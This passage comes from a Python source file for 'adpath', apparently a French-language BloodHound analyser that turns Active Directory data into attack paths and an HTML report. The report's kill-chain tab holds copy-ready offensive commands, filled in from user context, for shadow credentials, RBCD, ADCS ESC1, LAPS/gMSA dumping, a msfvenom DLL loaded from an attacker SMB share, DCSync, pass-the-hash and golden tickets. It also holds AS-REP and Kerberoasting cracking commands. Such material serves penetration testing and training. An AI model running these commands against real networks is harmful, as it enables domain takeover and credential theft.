      "v":[{"c":"Reset de mot de passe","cmds":["bloodyAD -u [USER] -p [PASS] -d [DOM] --host [DC] set password [TARGET] 'NewP@ss1!'","net rpc password [TARGET] 'NewP@ss1!' -U [DOM]/[USER]%[PASS] -S [DC]"]},
           {"c":"S'ajouter à un groupe","cmds":["bloodyAD -u [USER] -p [PASS] -d [DOM] --host [DC] add groupMember [GROUP] [USER]"]},
           {"c":"WriteDacl → se donner FullControl","cmds":["impacket-dacledit -action write -rights FullControl -principal [USER] -target [TARGET] [DOM]/[USER]:[PASS]"]}]},
     {"t":"9. Shadow Credentials","m":"T1556 / T1098.001",
      "why":"AddKeyCredentialLink sur un user/ordinateur → clé → PKINIT → NT hash.","tools":"pywhisker, certipy, Whisker (Win)",
      "v":[{"c":"Linux","cmds":["pywhisker -d [DOM] -u [USER] -p [PASS] --target [TARGET] --action add","certipy auth -pfx [TARGET].pfx -dc-ip [DC]"]},
           {"c":"Windows","cmds":["Whisker.exe add /target:[TARGET]"]}]},
     {"t":"10. Délégations Kerberos","m":"T1558 / T1134",
      "why":"Unconstrained / Constrained / RBCD → impersonation de comptes privilégiés.","tools":"impacket (findDelegation/getST/rbcd), Rubeus",
      "v":[{"c":"Trouver","cmds":["impacket-findDelegation [DOM]/[USER]:[PASS] -dc-ip [DC]"]},
           {"c":"RBCD","cmds":["impacket-rbcd -delegate-from [TARGET] -delegate-to [DC]$ -action write [DOM]/[USER]:[PASS]","impacket-getST -spn cifs/[DC] -impersonate Administrator [DOM]/[TARGET]:[PASS]"]}]},
     {"t":"11. ADCS (ESC1-ESC16)","m":"T1649",
      "why":"Modèles de certificats mal configurés → cert au nom d'un admin → auth.","tools":"certipy (Linux), Certify + Rubeus (Windows)",
      "v":[{"c":"Trouver les templates vulnérables","cmds":["certipy find -u [USER]@[DOM] -p [PASS] -dc-ip [DC] -vulnerable -stdout"]},
           {"c":"ESC1 : cert admin","cmds":["certipy req -u [USER]@[DOM] -p [PASS] -dc-ip [DC] -ca [CA] -template [TPL] -upn Administrator@[DOM]","certipy auth -pfx administrator.pfx -dc-ip [DC]"]}]},
     {"t":"12. LAPS / gMSA","m":"T1555 / T1552.006",
      "why":"Droit de lecture → mdp admin local (LAPS) ou mdp de compte de service (gMSA).","tools":"netexec, gMSADumper, pyLAPS",
      "v":[{"c":"LAPS","cmds":["nxc smb [DC] -u [USER] -p [PASS] --laps","python3 pyLAPS.py --action get -d [DOM] -u [USER] -p [PASS]"]},
           {"c":"gMSA","cmds":["python3 gMSADumper.py -u [USER] -p [PASS] -d [DOM]"]}]},
     {"t":"13. DnsAdmins → DC SYSTEM","m":"T1543 / T1574",
      "why":"Membre de DnsAdmins : DLL arbitraire dans le service DNS (SYSTEM sur le DC). [ATTACKER] = ta machine (share SMB).","tools":"msfvenom, dnscmd",
      "v":[{"c":"Préparer + charger la DLL","cmds":["msfvenom -p windows/x64/exec CMD='net group \"Domain Admins\" [USER] /add /domain' -f dll -o evil.dll","dnscmd [DC] /config /serverlevelplugindll \\\\[ATTACKER]\\share\\evil.dll"]}]},
     {"t":"14. DCSync","m":"T1003.006",
      "why":"Droits de réplication (GetChangesAll) → dump de tous les hashes (krbtgt, DA).","tools":"impacket-secretsdump, mimikatz",
      "v":[{"c":"Linux","cmds":["impacket-secretsdump [DOM]/[USER]:[PASS]@[DC] -just-dc","impacket-secretsdump [DOM]/[USER]:[PASS]@[DC] -just-dc-user krbtgt"]},
           {"c":"Avec hash (PtH)","cmds":["impacket-secretsdump -hashes :[NTHASH] [DOM]/[USER]@[DC] -just-dc"]}]},
     {"t":"15. Exécution / mouvement latéral","m":"T1021 / T1550.002",
      "why":"Avec mot de passe ou hash (Pass-the-Hash) : shell sur la cible [TARGET].","tools":"impacket (psexec/wmiexec/smbexec), evil-winrm, netexec",
      "v":[{"c":"Mot de passe","cmds":["impacket-wmiexec [DOM]/[USER]:[PASS]@[TARGET]","nxc smb [TARGET] -u [USER] -p [PASS] -x whoami"]},
           {"c":"Pass-the-Hash","cmds":["impacket-psexec -hashes :[NTHASH] [DOM]/Administrator@[TARGET]","evil-winrm -i [TARGET] -u Administrator -H [NTHASH]"]}]},
     {"t":"16. Persistance","m":"T1558.001 / T1098",
      "why":"Golden/Silver ticket, DCShadow — garder l'accès.","tools":"impacket-ticketer, mimikatz, Rubeus",
      "v":[{"c":"Golden ticket","cmds":["impacket-ticketer -nthash [NTHASH] -domain-sid [SID] -domain [DOM] Administrator","export KRB5CCNAME=Administrator.ccache"]}]},
    ]

def write_html(g, owned, path, qw, priv, reach, out):
    esc=lambda s:(str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"))
    domain=(g.data["domains"][0].get("Properties",{}).get("name") if g.data["domains"] else "DOMAIN.LOCAL")
    dc=next((norm(c.get("Properties",{}).get("name")) for c in g.data["computers"]), "DC")
    def cmd(c): return f'<div class=cmd><code>{esc(c)}</code><button onclick="cp(this)">copier</button></div>'
    def li(items): return "".join(f"<li>{esc(x)}</li>" for x in items) or "<li class=dim>—</li>"

    if path:  verdict=f'<div class="verdict found">✔ Chemin vers une cible à privilèges TROUVÉ — {len(path)-1} étape(s).</div>'
    elif reach: verdict=f'<div class="verdict none">⚠ Aucun chemin depuis les comptes owned. {len(reach)} compte(s) pivot à compromettre.</div>'
    else: verdict='<div class="verdict none">ℹ Aucun compte owned — passe <code>--owned u1,u2</code> pour un chemin. Vue par profils dispo.</div>'

    if path:
        steps=[]
        for i,s in enumerate(path):
            nm=esc(g.sid2name.get(s)); win="win" if g.is_highvalue(s) else ""
            link=f'<a class=plink onclick="goProfile(\'{s}\')">{nm}</a>' if s!=DCSYNC_NODE else f'<b>{nm}</b>'
            if i==0: steps.append(f'<div class="pathstep {win}"><div class=n>0</div><div class=t>{link} <span class=dim>(owned, départ)</span></div></div>')
            else:
                lbl=g.edge_label(path[i-1],s)
                steps.append(f'<div class="pathstep {win}"><div class=n>{i}</div><div class=t><span class=edge>{esc(lbl)}</span> → {link}<br><span class=hint>{esc(ABUSE_HINT.get(lbl,""))}</span></div></div>')
        pathblock="".join(steps)
        if g.sid2name.get(path[-1],"").startswith("DCSync"): pathblock+=cmd(f"impacket-secretsdump {domain}/<user>:<pass>@{dc} -just-dc")
    elif reach:
        rows="".join(f'<li><b class=cred>{esc(w)}</b> → {esc(" → ".join(p[1:] if len(p)>1 else p))}</li>' for w,p in sorted(reach.items(),key=lambda x:len(x[1])))
        pathblock=f'<p class=dim>Comptes non-privilégiés menant à une cible (clique un profil pour ses infos) :</p><ol>{rows}</ol>'
    else: pathblock='<p class=dim>—</p>'

    asrep=f"<b>AS-REP roastable</b> <span class='badge b-hi'>HIGH</span><ul>{li(qw['asrep'])}</ul>"+(cmd(f"impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {dc} -format hashcat -outputfile asrep.hash\nhashcat -m 18200 asrep.hash rockyou.txt") if qw['asrep'] else "")
    kerb=f"<b>Kerberoastable (SPN)</b> <span class='badge b-hi'>HIGH</span><ul>{li(qw['kerberoast'])}</ul>"+(cmd(f"impacket-GetUserSPNs {domain}/<user>:<pass> -dc-ip {dc} -request -outputfile kerb.hash\nhashcat -m 13100 kerb.hash rockyou.txt") if qw['kerberoast'] else "")
    descp="<b>Mots de passe en description</b> <span class='badge b-hi'>HIGH</span><ul>"+("".join(f"<li><span class=cred>{esc(d)}</span></li>" for d in qw['desc_pwd']) or "<li class=dim>—</li>")+"</ul>"
    pnr=f"<b>pwd-not-required</b> <span class='badge b-md'>MED</span><ul>{li(qw['pwdnotreqd'])}</ul>"
    laps=f"<b>LAPS en place</b> <span class='badge b-lo'>INFO</span><ul>{li(qw['laps'])}</ul>"
    def mlink(m):
        sid=g.name2sid.get(m.lower())
        return f'<a class=plink onclick="goProfile(\'{sid}\')">{esc(m)}</a>' if sid else esc(m)
    privrows="".join(f"<tr><td>{esc(k)}</td><td>{', '.join(mlink(m) for m in v)}</td></tr>" for k,v in priv.items()) or "<tr><td class=dim>—</td><td></td></tr>"

    info,name2sid=_node_info(g,owned,qw)
    data=json.dumps({"nodes":info,"name2sid":name2sid}, ensure_ascii=False).replace("</","<\\/")
    mm=_graph_clickable(g,path,reach)

    # Vue Kill Chain : sous-nav + une "page" par phase, commandes remplies en live via [TOKENS]
    attr=lambda s:esc(s).replace('"',"&quot;")
    def kcmd(tpl): return f'<div class=cmd><code data-tpl="{attr(tpl)}">{esc(tpl)}</code><button onclick="cp(this)">copier</button></div>'
    kc=build_killchain()
    kc_nav="".join(f'<div class=pitem id=kcnav-{i} onclick="showPhase({i})">{esc(p["t"])}</div>' for i,p in enumerate(kc))
    kc_body=""
    for i,p in enumerate(kc):
        variants=""
        for v in p["v"]:
            variants+=f'<p class=vlabel>▸ {esc(v["c"])}</p>'+"".join(kcmd(c) for c in v["cmds"])
        kc_body+=(f'<div class=kcphase id=phase-{i} style="display:none">'
                  f'<div class=card><h2 onclick="tog(this)"><span>{esc(p["t"])} <span class="badge b-hi">{esc(p["m"])}</span></span><span class=chev>▾</span></h2>'
                  f'<div class=body><p>{esc(p["why"])}</p>'
                  f'<p class=dim>Outils : {esc(p["tools"])}</p>{variants}</div></div></div>')

    html=f"""<!doctype html><html lang=fr><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>adpath — {esc(domain)}</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.1/mermaid.min.js"></script>
<style>{HTML_CSS}</style></head><body>
<header><h1>adpath <small>— {esc(domain)}</small></h1>
<div class=meta>{len(g.data['users'])} users · {len(g.data['groups'])} groups · {len(g.data['computers'])} computers &nbsp;|&nbsp; Owned : <span class=cred>{esc(', '.join(sorted(owned)) or '—')}</span> &nbsp;|&nbsp; {time.strftime('%Y-%m-%d %H:%M')}</div></header>
<div class=tabs>
<div class=tab id=tab-resume onclick="show('resume')">Résumé</div>
<div class=tab id=tab-schema onclick="show('schema')">Schéma</div>
<div class=tab id=tab-profils onclick="show('profils')">Profils</div>
<div class=tab id=tab-killchain onclick="show('killchain')">Kill Chain</div></div>
<main>
<div class="view" id="view-resume">{verdict}
<div class=card><h2 onclick="tog(this)">Chemin d'attaque <span class=chev>▾</span></h2><div class=body>{pathblock}</div></div>
<div class=grid>
<div class=card><h2 onclick="tog(this)">Quick-wins identifiants <span class=chev>▾</span></h2><div class=body>{asrep}{kerb}{pnr}</div></div>
<div class=card><h2 onclick="tog(this)">Secrets exposés <span class=chev>▾</span></h2><div class=body>{descp}{laps}</div></div></div>
<div class=card><h2 onclick="tog(this)">Cibles à privilèges <span class=chev>▾</span></h2><div class=body><table class=prv>{privrows}</table></div></div></div>
<div class="view" id="view-schema">
<p class=dim>Schéma du chemin / de la surface d'attaque — <b>clique un nœud</b> pour voir le profil.</p>
<div class="mermaid">{mm}</div>
<pre class="mfallback">[Mermaid non chargé — hors-ligne ? Vois l'onglet Profils]\n\n{esc(mm)}</pre></div>
<div class="view" id="view-profils">
<div class=playout>
<div><input class=search id=psearch placeholder="rechercher un profil…" oninput="buildList(this.value)"><div class=plist id=plist></div></div>
<div class=pdetail id=pdetail><p class=dim>← choisis un profil (ou clique un nœud du schéma) pour voir ses infos : propriétés, groupes, qui le contrôle, ce qu'il contrôle.</p></div>
</div></div>
<div class="view" id="view-killchain">
<p class=dim>Méthodo d'attaque AD, phase par phase. <b>Renseigne ton contexte ci-dessous</b> → toutes les commandes se remplissent automatiquement selon ta situation.</p>
<div class=ctxbar>
<label>DC (IP/host) <input id=ctx-DC oninput="applyCtx()" value="{esc(dc)}"></label>
<label>Domaine <input id=ctx-DOM oninput="applyCtx()" value="{esc(domain)}"></label>
<label>User <input id=ctx-USER oninput="applyCtx()" placeholder="user"></label>
<label>Password <input id=ctx-PASS oninput="applyCtx()" placeholder="pass"></label>
<label>NT hash <input id=ctx-NTHASH oninput="applyCtx()" placeholder="nthash"></label>
<label>Cible <input id=ctx-TARGET oninput="applyCtx()" placeholder="user/host ciblé"></label>
<label>Ton IP <input id=ctx-ATTACKER oninput="applyCtx()" placeholder="attacker IP"></label>
</div>
<div class=playout>
<div class=plist id=kcnav>{kc_nav}</div>
<div class=pdetail id=kcbody>{kc_body}</div>
</div></div>
<p class=foot>Généré par <b>adpath</b> · {time.strftime('%Y-%m-%d %H:%M')}</p>
</main>
<script>const DATA={data};</script>
<script>{HTML_JS}</script>
</body></html>"""
    open(out,"w",encoding="utf-8").write(html)

def main():
    ap=argparse.ArgumentParser(description="Analyseur offline BloodHound → chemins d'attaque (générique)")
    ap.add_argument("input", nargs="?", help="dossier de .json BloodHound OU un .zip (pas requis avec --collect)")
    ap.add_argument("--owned", default="", help="comptes compromis (séparés par des virgules)")
    ap.add_argument("--mermaid", help="fichier de sortie du schéma Mermaid")
    ap.add_argument("--html", help="rapport HTML (schéma + tableaux) — ex: report.html")
    ap.add_argument("--open", dest="do_open", action="store_true", help="ouvrir le rapport HTML dans le navigateur")
    ap.add_argument("--json", dest="jsonout", help="fichier de sortie des résultats en JSON")
    ap.add_argument("--max-hops", type=int, default=4, help="profondeur max pour la surface d'attaque")
    # --- mode collecte optionnel (wrapper bloodhound-python) ---
    gc=ap.add_argument_group("collecte (optionnel : lance bloodhound-python puis analyse)")
    gc.add_argument("--collect", action="store_true", help="collecter via bloodhound-python avant d'analyser")
    gc.add_argument("-d","--domain", help="domaine FQDN (ex: sevenkingdoms.local)")
    gc.add_argument("-u","--user", help="utilisateur pour la collecte")
    gc.add_argument("-p","--password", help="mot de passe pour la collecte")
    gc.add_argument("--dc-ip", help="IP du DC (nameserver)")
    gc.add_argument("--out", help="dossier de sortie de la collecte")
    a=ap.parse_args()
    if a.collect:
        if not all([a.domain, a.user, a.password, a.dc_ip]):
            ap.error("--collect exige -d/--domain, -u/--user, -p/--password et --dc-ip")
        folder=collect(a.domain, a.user, a.password, a.dc_ip, a.out)
        data=load_input(folder)
        # si l'utilisateur fait la collecte avec un compte, on le marque owned par défaut
        if not a.owned: a.owned=a.user
    else:
        if not a.input: ap.error("fournis un dossier/zip BloodHound, ou utilise --collect")
        data=load_input(a.input)
    if not data.get("users"):
        print("Aucun *users.json trouvé. Vérifie le dossier/zip (export SharpHound/bloodhound-python).", file=sys.stderr); sys.exit(1)
    g=Graph(data)
    wins=g.win_nodes()
    owned_names=[x.strip().lower() for x in a.owned.split(",") if x.strip()]
    owned_sids=[g.name2sid[n] for n in owned_names if n in g.name2sid]
    missing=[n for n in owned_names if n not in g.name2sid]
    if missing: print(f"[!] introuvables (ignorés) : {', '.join(missing)}", file=sys.stderr)
    path=g.shortest_path(set(owned_sids), wins) if owned_sids else None
    reach=None if path else g.reachers(wins, a.max_hops)
    qw=quick_wins(g); priv=privileged(g)
    owned_disp=set(g.sid2name[s] for s in owned_sids)
    report=render(g, owned_disp, path, qw, priv, reach)
    print(report)
    if a.mermaid:
        write_mermaid(g, owned_disp, path, reach, a.mermaid); print(f"\n[+] Schéma → {a.mermaid}")
    # HTML : auto si --open sans --html
    html_path = a.html or (os.path.join(tempfile.gettempdir(), f"adpath_report_{int(time.time())}.html") if a.do_open else None)
    if html_path:
        write_html(g, owned_disp, path, qw, priv, reach, html_path)
        print(f"[+] Rapport HTML → {html_path}")
        if a.do_open:
            import webbrowser
            try: webbrowser.open(f"file://{os.path.abspath(html_path)}"); print("[+] Ouverture dans le navigateur…")
            except Exception as e: print(f"[!] ouverture auto impossible ({e}) — ouvre le fichier à la main")
    if a.jsonout:
        json.dump({"owned":sorted(owned_disp),"quick_wins":qw,"privileged":priv,
                   "path":[g.sid2name.get(s,s) for s in path] if path else None,
                   "reachers":reach}, open(a.jsonout,"w"), indent=2, ensure_ascii=False)
        print(f"[+] JSON → {a.jsonout}")

if __name__=="__main__":
    main()
